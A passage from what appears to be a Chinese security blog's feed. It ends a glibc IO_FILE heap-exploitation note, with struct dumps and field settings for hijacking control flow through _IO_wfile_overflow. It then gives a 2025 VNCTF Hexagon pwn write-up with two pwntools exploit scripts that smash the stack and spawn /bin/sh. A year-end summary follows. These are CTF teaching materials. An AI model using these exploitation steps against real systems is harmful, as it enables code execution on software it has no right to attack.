_wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure><p>可以看到调用的是<code>_wide_vtable</code>里的<code>__doallocate</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> </span><br><span class="line">file = &#123;</span><br><span class="line">    _flags = <span class="number">-72537977</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x7f6d399137e4</span> &lt;_IO_2_1_stdout_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x7f6d39912a80</span> &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = <span class="number">1</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">-1</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x7f6d39915730</span> &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = <span class="number">-1</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7f6d39912980</span> &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">-1</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7f6d39914560</span> &lt;__GI__IO_file_jumps&gt;</span><br></pre></td></tr></table></figure><p>有一个<code>_wide_data</code>结构体，之前分析调用的是<code>_wide_data</code>的<code>wide_vtable</code>里的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line"> _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line"> _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_state = &#123;</span><br><span class="line">   __count = <span class="number">0</span>,</span><br><span class="line">   __value = &#123;</span><br><span class="line">     __wch = <span class="number">0</span>,</span><br><span class="line">     __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _IO_last_state = &#123;</span><br><span class="line">   __count = <span class="number">0</span>,</span><br><span class="line">   __value = &#123;</span><br><span class="line">     __wch = <span class="number">0</span>,</span><br><span class="line">     __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _codecvt = &#123;</span><br><span class="line">   __cd_in = &#123;</span><br><span class="line">     step = <span class="number">0x0</span>,</span><br><span class="line">     step_data = &#123;</span><br><span class="line">       __outbuf = <span class="number">0x0</span>,</span><br><span class="line">       __outbufend = <span class="number">0x0</span>,</span><br><span class="line">       __flags = <span class="number">0</span>,</span><br><span class="line">       __invocation_counter = <span class="number">0</span>,</span><br><span class="line">       __internal_use = <span class="number">0</span>,</span><br><span class="line">       __statep = <span class="number">0x0</span>,</span><br><span class="line">       __state = &#123;</span><br><span class="line">         __count = <span class="number">0</span>,</span><br><span class="line">         __value = &#123;</span><br><span class="line">           __wch = <span class="number">0</span>,</span><br><span class="line">           __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">   __cd_out = &#123;</span><br><span class="line">     step = <span class="number">0x0</span>,</span><br><span class="line">     step_data = &#123;</span><br><span class="line">       __outbuf = <span class="number">0x0</span>,</span><br><span class="line">       __outbufend = <span class="number">0x0</span>,</span><br><span class="line">       __flags = <span class="number">0</span>,</span><br><span class="line">       __invocation_counter = <span class="number">0</span>,</span><br><span class="line">       __internal_use = <span class="number">0</span>,</span><br><span class="line">       __statep = <span class="number">0x0</span>,</span><br><span class="line">       __state = &#123;</span><br><span class="line">         __count = <span class="number">0</span>,</span><br><span class="line">         __value = &#123;</span><br><span class="line">           __wch = <span class="number">0</span>,</span><br><span class="line">           __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _shortbuf = <span class="string">L&quot;&quot;</span>,</span><br><span class="line"> _wide_vtable = <span class="number">0x7f6d39914020</span> &lt;__GI__IO_wfile_jumps&gt;</span><br></pre></td></tr></table></figure><p>因此有以下利用：</p><ul><li>将 <code>IO_FILE</code> 中的 <code>vtable</code> 字段改为 <code>_IO_wfile_jumps</code></li><li>将 <code>IO_FILE</code> 中的 <code>wide_data</code> 设置为可控堆地址，目的是控制 <code>wide_data</code> 中的 <code>write_base</code> 和 <code>buf_base</code> 为0</li><li>控制 <code>wide_data-&gt;wide_vtable</code> 为地址 <code>A</code>，地址 <code>A</code> 满足 <code>*(A+0x68) == system</code> （此处的 <code>system</code> 地址是自己布置的）</li></ul><p>总结下执行到最后的位置<strong>需要绕过的检查</strong></p><ol><li><code>_flags</code> 设置为<code>~(2 | 0x8 | 0x800)</code> ，如果是需要获取 <code>shell</code> 的话，那么可以将参数写为 <code>sh;</code> 这样 <code>_flags</code> 既能绕过检查，又能被 <code>system</code> 函数当做参数成功执行。需要注意的是 <code>sh;</code> 前面是有两个空格的（这个值是 <code>0x3b68732020</code> ）</li><li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code> , <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code></li><li><code>fp-&gt;_mode == 0</code> 和 <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> ,这样即可触发 <code>_IO_OVERFLOW</code>。</li></ol><h3 id="相关技巧-20"><a href="#相关技巧-20" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>利用<code>_IO_wfile_overflow</code> 函数控制程序执行流时对 <code>fp</code> 的设置如下：</p><ul><li><code>_flags</code> 设置为 <code>~(2 | 0x8 | 0x800)</code>，如果不需要控制 <code>rdi</code>，设置为 <code>0</code> 即可；如果需要获得 <code>shell</code>，可设置为<code> sh;</code>，注意前面有两个空格</li><li><code>vtable</code> 设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code> 即可</li><li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>，即满足 <code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code> 设置为可控堆地址 <code>B</code>，即满足 <code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 设置为地址 <code>C</code> 用于劫持 <code>RIP</code>，即满足 <code>*(B + 0x68) = C</code></li></ul><h3 id="利用效果-20"><a href="#利用效果-20" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;house-of手法&quot;&gt;&lt;a href=&quot;#house-of手法&quot; class=&quot;headerlink&quot; title=&quot;house of手法&quot;&gt;&lt;/a&gt;house of手法&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="house of" scheme="http://s1nec-1o.github.io/categories/house-of/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hexagon学习</title>
    <link href="http://s1nec-1o.github.io/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/"/>
    <id>http://s1nec-1o.github.io/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-02-13T07:36:57.000Z</published>
    <updated>2025-02-13T07:39:36.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexagon-学习"><a href="#Hexagon-学习" class="headerlink" title="Hexagon 学习"></a>Hexagon 学习</h1><p><strong>Hexagon</strong> 是高通（Qualcomm）开发的 <strong>数字信号处理器（DSP）</strong> 架构，专为移动设备、物联网和边缘计算设计，以高效能、低功耗为核心优势。它被集成在高通骁龙（Snapdragon）系列芯片中</p><ul><li>hexagon用<strong>allocframe</strong>开辟栈帧：LR压栈，FP压栈，SP减去一定数值向低地址开辟，FP设置成指向旧FP的指针。deallocframe&#x2F;dealloc_return用于销毁栈帧&#x2F;销毁栈帧并返回，从栈底取回FP和LR。</li></ul><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202502131539009.png" alt="image-20250208213002824" style="zoom: 33%;" /><ul><li>一共有32个32位通用寄存器，r0-r31。存在寄存器对，可以当做64位寄存器使用，如r0和r1可以合并成r1:0</li><li>r29-r31是别名寄存器。r29是SP，r30是FP，r31是LR寄存器。SP是栈顶寄存器，FP是栈（底）寄存器，LR是储存返回地址的寄存器。</li></ul><p>看汇编感觉是类arm架构</p><p>主要的汇编有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allocframe(#0x10) #开辟栈空间</span><br><span class="line">add(r0,#-0x10) #加减乘除，有返回值</span><br><span class="line">call func</span><br><span class="line">dealloc_return #pop and ret (类似pop，但是hexagon是么有pop滴)</span><br><span class="line">memw(r1) #取指针指向的内容</span><br></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="『2025VNCTF』hexagon"><a href="#『2025VNCTF』hexagon" class="headerlink" title="『2025VNCTF』hexagon"></a>『2025VNCTF』hexagon</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00020460</span>                 .global vuln</span><br><span class="line">.text:<span class="number">00020460</span> vuln:                                   <span class="comment">// CODE XREF: main+90↓p</span></span><br><span class="line">.text:<span class="number">00020460</span>                 &#123; <span class="built_in">allocframe</span>(#<span class="number">0x10</span>) &#125;</span><br><span class="line">.text:<span class="number">00020464</span>                 &#123; r0 = <span class="built_in">add</span>(pc, ##aD@pcrel) &#125; <span class="comment">// &quot;%d&quot;</span></span><br><span class="line">.text:<span class="number">0002046</span>C                 &#123; r1 = <span class="built_in">add</span>(fp, #<span class="number">-0x10</span>) &#125;</span><br><span class="line">.text:<span class="number">00020470</span>                 &#123; call scanf &#125;</span><br><span class="line">.text:<span class="number">00020474</span>                 &#123; r0 = #<span class="number">0</span> &#125;             <span class="comment">// fd</span></span><br><span class="line">.text:<span class="number">00020478</span>                 &#123; r1 = <span class="built_in">add</span>(fp, #<span class="number">-8</span>) &#125;   <span class="comment">// buf</span></span><br><span class="line">.text:<span class="number">0002047</span>C                 &#123; r2 = #<span class="number">0x10</span> &#125;          <span class="comment">// nbytes</span></span><br><span class="line">.text:<span class="number">00020480</span>                 &#123; call read &#125;</span><br><span class="line">.text:<span class="number">00020484</span>                 &#123; r0 = <span class="built_in">add</span>(pc, ##aCatHomeCtfLog@pcrel) &#125; <span class="comment">// &quot;cat /home/ctf/log&quot;</span></span><br><span class="line">.text:<span class="number">0002048</span>C                 &#123; call system &#125;</span><br><span class="line">.text:<span class="number">00020490</span>                 &#123; nop</span><br><span class="line">.text:<span class="number">00020494</span>                   nop</span><br><span class="line">.text:<span class="number">00020498</span>                   nop</span><br><span class="line">.text:<span class="number">0002049</span>C                   dealloc_return &#125;</span><br><span class="line">.text:<span class="number">0002049</span>C <span class="comment">// End of function vuln</span></span><br></pre></td></tr></table></figure><p>发现allocframe只开辟了0x10个字节的栈空间，然后read的起始地址是从fp-8开始的，再结合32位的4字节地址，显然有栈溢出8个字节，溢出到FP和LR的存储空间，而LR是存取返回地址的，便有劫持返回地址。</p><h4 id="解法1-system执行"><a href="#解法1-system执行" class="headerlink" title="解法1-system执行"></a>解法1-system执行</h4><p>看了官方wp之后</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202502131539011.png" alt="image-20250210142817772"></p><p>从libc.so中找到system，发现偏底层的system实现方式是通过posix_spawn进程创建函数（理解为fork+execve即可），通过对参数的简单分析，可以知道r1&#x3D;”&#x2F;bin&#x2F;sh”，然后argv[] &#x3D; {“sh”, “-c”, user_input, NULL};，而这个usr_input是通过fp-0x10输入的，详情自行查看posix_spawn的参数</p><p>然后回到题目发现一开始有一个scanf函数是输入fp-0x10的，那么局势就很明朗了，同时由于qemu的libc是不会改变的，因此传入一个&#x2F;bin&#x2F;sh的地址就行啦</p><p>libc地址的寻找：</p><p>这里是通过日志来寻找的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set_tid_address</span>(<span class="number">1073672412</span>,<span class="number">1073672412</span>,<span class="number">-4</span>,<span class="number">0</span>,<span class="number">1072439316</span>,<span class="number">67108864</span>) = <span class="number">7</span></span><br></pre></td></tr></table></figure><p>而这个1073672412是指针地址，通常由libc分配的存储tid（线程id）的，从libc中寻找到对应的结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0012F</span>0DC __thread_list_lock:.space <span class="number">1</span>             <span class="comment">// DATA XREF: __init_tp+70↑o</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DC                                         <span class="comment">// __post_Fork+28↑o ...</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DD                 .space <span class="number">1</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DE                 .space <span class="number">1</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DF                 .space <span class="number">1</span></span><br></pre></td></tr></table></figure><p>相减获得libc_base&#x3D;0x3FEC0000（算是取巧吧，因为我的qemu单步执行坏掉啦&#x2F;(ㄒoㄒ)&#x2F;~~）</p><p>本地环境与远程有差距，不过方法类似</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="built_in">process</span>([<span class="string">&#x27;qemu-hexagon&#x27;</span> , <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20420+0xc0&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./main&#x27;</span>])</span><br><span class="line">libc_base=<span class="number">0x40810000</span></span><br><span class="line">fp=<span class="number">0x4080f078</span></span><br><span class="line">binsh = libc_base+<span class="number">0x119f7</span></span><br><span class="line"><span class="built_in">ru</span>(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="built_in">sl</span>(<span class="built_in">tbs</span>(binsh))</span><br><span class="line">payload = <span class="built_in">p32</span>(<span class="number">0</span>)*<span class="number">2</span>+<span class="built_in">p32</span>(fp+<span class="number">8</span>)+<span class="built_in">p32</span>(libc_base+<span class="number">0xBE7C0</span>)</span><br><span class="line"><span class="built_in">s</span>(payload)</span><br><span class="line"><span class="built_in">irt</span>()</span><br></pre></td></tr></table></figure><h4 id="解法2-栈迁移"><a href="#解法2-栈迁移" class="headerlink" title="解法2-栈迁移"></a>解法2-栈迁移</h4><p>对1血脚本学习。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">stack_addr = <span class="number">0x4080f1c8</span></span><br><span class="line">libc_base= <span class="number">0x3FEC0000</span></span><br><span class="line">gadget1 = <span class="number">0x20534</span> <span class="comment"># r0 = memw(fp + #var_8) dealloc_return</span></span><br><span class="line">gadget2 = libc_base + <span class="number">0xDB2CC</span> <span class="comment"># r0 = memw(fp + #var_4) dealloc_return</span></span><br><span class="line">gadget3 = libc_base + <span class="number">0x54630</span> <span class="comment"># r0 = memw(fp -0x10 ) dealloc_return</span></span><br><span class="line">ret = <span class="number">0x20538</span></span><br><span class="line">bss = <span class="number">0x406d0</span></span><br><span class="line">bss = stack_addr</span><br><span class="line">target = <span class="number">0x1039E</span></span><br><span class="line">call_system = <span class="number">0x2048C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">str</span>(<span class="number">0x1000</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Welcome back, hexagon player!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss-<span class="number">0x30</span>+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p32(bss-<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x4080f198</span>) + <span class="string">b&#x27;bbbb&#x27;</span> + p32(bss-<span class="number">0x10</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(<span class="number">0x2048C</span>) + p32(bss-<span class="number">0x10</span>) + p32(gadget3)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x30 /bin/sh          </span></span><br><span class="line"><span class="comment"># bss-0x2c xxxx</span></span><br><span class="line"><span class="comment"># bss-0x28 bss-0x20+8</span></span><br><span class="line"><span class="comment"># bss-0x24 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x20 0x4080f198       </span></span><br><span class="line"><span class="comment"># bss-0x1c bbbb</span></span><br><span class="line"><span class="comment"># bss-0x18 bss-0x10+8</span></span><br><span class="line"><span class="comment"># bss-0x14 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x10 sh          </span></span><br><span class="line"><span class="comment"># bss-0xc  0xdeadbeaf</span></span><br><span class="line"><span class="comment"># bss-8    bss-0x10</span></span><br><span class="line"><span class="comment"># bss-4    gadget3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss      aaaa              </span></span><br><span class="line"><span class="comment"># bss+4    aaaa</span></span><br><span class="line"><span class="comment"># bss+8    bss-0x30+8</span></span><br><span class="line"><span class="comment"># bss+0xc  start_read</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>有意思的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexagon-学习&quot;&gt;&lt;a href=&quot;#Hexagon-学习&quot; class=&quot;headerlink&quot; title=&quot;Hexagon 学习&quot;&gt;&lt;/a&gt;Hexagon 学习&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Hexagon&lt;/strong&gt; 是高通（Qualcomm）</summary>
      
    
    
    
    <category term="hexagon-pwn" scheme="http://s1nec-1o.github.io/categories/hexagon-pwn/"/>
    
    
    <category term="hexagon" scheme="http://s1nec-1o.github.io/tags/hexagon/"/>
    
  </entry>
  
  <entry>
    <title>2024年终总结</title>
    <link href="http://s1nec-1o.github.io/2025/02/01/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>http://s1nec-1o.github.io/2025/02/01/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2025-02-01T08:50:35.000Z</published>
    <updated>2025-02-01T09:01:57.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024年终总结"><a href="#2024年终总结" class="headerlink" title="2024年终总结"></a>2024年终总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次写年终总结呢，一年过的好快，大一小登-&gt;大二老登，感觉下半年有点摆烂（，主要还是对IoT领域的不了解，以及自身能力的缺陷，希望明年能加以改进，在此写下2024年的收获与对2025的希冀</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol><li>获得了第一枚CVE，从0到1的突破！！</li><li>获得了ciscn华东南分区的二等奖</li><li>结识了许多伙伴</li></ol><p>能说的上号的也就这几个🥲，但最珍贵的还是心态上的转变以及对自我的清晰认知</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ol><li>获取大厂类似思科，华为，华硕等的各一枚CVE</li><li>补足Web安全的知识</li><li>获得几个比赛的奖项（Pwn！！！）</li><li>硬件安全</li><li>无线电安全</li><li>最后，希望能挖到一枚未授权RCE</li></ol><p>希望 2025的我 万事胜意！天天开心！努力学习！天天向上！哦耶</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024年终总结&quot;&gt;&lt;a href=&quot;#2024年终总结&quot; class=&quot;headerlink&quot; title=&quot;2024年终总结&quot;&gt;&lt;/a&gt;2024年终总结&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="2024年终总结" scheme="http://s1nec-1o.github.io/categories/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="年终总结" scheme="http://s1nec-1o.github.io/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>初探XSS</title>
    <link href="http://s1nec-1o.github.io/2025/01/23/%E5%88%9D%E6%8E%A2XSS/"/>
    <id>http://s1nec-1o.github.io/2025/01/23/%E5%88%9D%E6%8E%A2XSS/</id>
    <published>2025-01-23T06:06:48.000Z</published>
    <updated>2025-01-23T06:17:01.427Z</updated>
    
